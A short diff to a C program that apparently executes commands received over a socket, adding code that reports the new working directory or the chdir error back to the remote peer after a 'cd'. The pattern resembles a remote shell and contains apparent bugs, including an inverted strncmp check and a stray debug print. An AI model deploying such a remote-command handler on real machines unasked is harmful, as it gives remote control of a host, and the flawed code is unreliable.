@@ -86,14 +86,22 @@ int main (int argc, char * argv[])
         }
         else if(strncmp(command,"cd", 3))
         {
+            char cwd[1048];
             int status;
             const char * separator = " ";
             char * strToken = strtok(command, separator); //spliting array in two array in order to get the path
             strToken = strtok(NULL, separator);
+            printf("%s", separator);
             status = chdir(strToken);
             if (status !=0 )
             {
                 send(sockid, (const char *)strerror(errno), strlen(strerror(errno)),0);
+            }
+            else 
+            {
+                getcwd(cwd, 1024);
+                send(sockid, (const char *)cwd, strlen(cwd),0);
+                
             }
             
         }
